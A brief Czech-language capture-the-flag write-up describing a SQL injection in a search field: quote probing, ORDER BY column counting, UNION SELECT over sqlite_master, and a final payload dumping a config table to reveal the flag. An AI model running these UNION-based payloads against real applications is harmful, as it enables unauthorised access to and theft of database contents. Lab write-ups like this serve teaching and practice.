# Injection-Task
1. Průzkum
Zkusil jsem do vyhledávání zadat jednoduchou uvozovku '. Stránka vyhodila chybu, což znamená, že vstup není zabezpečený a můžu tam zkusit poslat vlastní SQL příkazy.

2. Zjištění struktury
Potřeboval jsem vědět, kolik sloupců tabulka má, abych mohl použít UNION.

Zkoušel jsem ' ORDER BY 1--, ' ORDER BY 2-- (to fungovalo) a ' ORDER BY 3-- (to už hodilo chybu). Takže jsou tam 2 sloupce.

Potom jsem vypsal seznam tabulek pomocí:
' UNION SELECT name, sql FROM sqlite_master WHERE type='table'--
Tím jsem zjistil, že existuje tabulka config, která má sloupce key a value.

3. Exfiltrace dat (Získání vlajky)
Věděl jsem, že vlajka bude v tabulce config. Použil jsem tenhle finální příkaz, abych vypsal její obsah:

Payload: ' UNION SELECT key, value FROM config--

Díky tomu se pod seznamem uživatelů objevila vlajka:
FLAG{Sql_Un1on_M4st3r_S0SE}
